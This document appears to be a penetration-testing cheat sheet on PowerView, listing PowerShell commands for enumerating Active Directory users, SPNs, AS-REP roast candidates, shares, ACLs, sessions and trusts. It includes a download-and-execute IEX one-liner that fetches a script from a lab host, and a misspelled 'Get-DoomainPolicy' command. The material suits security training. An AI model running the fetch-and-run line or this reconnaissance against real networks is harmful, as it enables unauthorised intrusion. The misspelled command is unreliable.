**PowerView** is a tool (a PowerShell module) for **Active Directory enumeration and reconnaissance**. It is not an exploit: it’s used to map the domain, find users, computers, shares, GPOs, delegations and possible attack vectors before attempting access or privilege escalation.


---

# What it’s used for (main capabilities)

- Enumerating domain users, groups and computers.
- Finding policies (password/lockout/Kerberos), OUs and GPOs.
- Locating interesting shares, machines with RDP/WinRM, privileged accounts or delegation settings.    
- Discovering relationships between accounts and services (for example, accounts used by services).
- Automating the search for vectors: accounts without preauth, accounts with SPNs (Kerberoasting), unpatched machines, etc.


---

## How to load and run it 

You can execute PowerView in memory (it won’t leave a file on disk if you load it with `IEX`), for example:

```powershell
# Download and execute in memory (lab)
IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5:8000/PowerView.ps1')

# Or, if you already have the file locally
. .\PowerView.ps1    # dot-source to import functions into the session
```

> Note: many defenses detect `IEX` + download + script execution, so this is noisy in production environments.

---

## Useful commands & examples 

Basic domain enumeration:

```powershell
Get-NetDomain               # general domain info
Get-DomainPolicy            # domain policies (password/lockout)
Get-NetForest               # forest info
```

List users and properties:

```powershell
Get-NetUser                 # list users (sAMAccountName, etc.)
Get-DomainUser -Properties userAccountControl |
  Select-Object sAMAccountName,userAccountControl
```

Find “Do not require preauthentication” accounts (AS-REP roast candidates):

```powershell
Get-DomainUser | Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" }
```

Enumerate computers and services:

```powershell
Get-NetComputer            # list computers
Invoke-ShareFinder         # search for interesting shares on domain machines
Find-InterestingDomainShare  # find shares that might contain creds/flags
```

Find SPNs for Kerberoasting:

```powershell
Get-DomainUser -SPN        # list accounts with SPNs
Get-DomainSID             # get domain SID
```

Search for delegation / privileged accounts:

```powershell
Get-ObjectAcl -SamAccountName 'Domain Users' -ResolveGUIDs  # advanced example
Get-NetGroupMember -Identity 'Domain Admins'
```

Enumerate ACLs and objects where a user can write:

```powershell
Get-ObjectAcl -DistinguishedName "CN=SomeObject,..." -ResolveGUIDs
# or find computers where a user is allowed to create services
Get-ADComputer -Filter * -Properties msDS-AllowedToDelegateTo  # example using AD cmdlets
```

Find active sessions / machines with RDP/WinRM:

```powershell
Get-NetSession               # SMB sessions
Get-NetLoggedon -Remote      # logged-on sessions on remote hosts
```

Enumerate the Password Policy:

```powershell
Get-DoomainPolicy            # Obtains the Pass-pol
```


####  Commands summary

|**Command**|**Description**|
|---|---|
|`Export-PowerViewCSV`|Append results to a CSV file|
|`ConvertTo-SID`|Convert a User or group name to its SID value|
|`Get-DomainSPNTicket`|Requests the Kerberos ticket for a specified Service Principal Name (SPN) account|
|**Domain/LDAP Functions:**||
|`Get-Domain`|Will return the AD object for the current (or specified) domain|
|`Get-DomainController`|Return a list of the Domain Controllers for the specified domain|
|`Get-DomainUser`|Will return all users or specific user objects in AD|
|`Get-DomainComputer`|Will return all computers or specific computer objects in AD|
|`Get-DomainGroup`|Will return all groups or specific group objects in AD|
|`Get-DomainOU`|Search for all or specific OU objects in AD|
|`Find-InterestingDomainAcl`|Finds object ACLs in the domain with modification rights set to non-built in objects|
|`Get-DomainGroupMember`|Will return the members of a specific domain group|
|`Get-DomainFileServer`|Returns a list of servers likely functioning as file servers|
|`Get-DomainDFSShare`|Returns a list of all distributed file systems for the current (or specified) domain|
|**GPO Functions:**||
|`Get-DomainGPO`|Will return all GPOs or specific GPO objects in AD|
|`Get-DomainPolicy`|Returns the default domain policy or the domain controller policy for the current domain|
|**Computer Enumeration Functions:**||
|`Get-NetLocalGroup`|Enumerates local groups on the local or a remote machine|
|`Get-NetLocalGroupMember`|Enumerates members of a specific local group|
|`Get-NetShare`|Returns open shares on the local (or a remote) machine|
|`Get-NetSession`|Will return session information for the local (or a remote) machine|
|`Test-AdminAccess`|Tests if the current user has administrative access to the local (or a remote) machine|
|**Threaded 'Meta'-Functions:**||
|`Find-DomainUserLocation`|Finds machines where specific users are logged in|
|`Find-DomainShare`|Finds reachable shares on domain machines|
|`Find-InterestingDomainShareFile`|Searches for files matching specific criteria on readable shares in the domain|
|`Find-LocalAdminAccess`|Find machines on the local domain where the current user has local administrator access|
|**Domain Trust Functions:**||
|`Get-DomainTrust`|Returns domain trusts for the current domain or a specified domain|
|`Get-ForestTrust`|Returns all forest trusts for the current forest or a specified forest|
|`Get-DomainForeignUser`|Enumerates users who are in groups outside of the user's domain|
|`Get-DomainForeignGroupMember`|Enumerates groups with users outside of the group's domain and returns each foreign member|
|`Get-DomainTrustMapping`|Will enumerate all trusts for the current domain and any others seen.|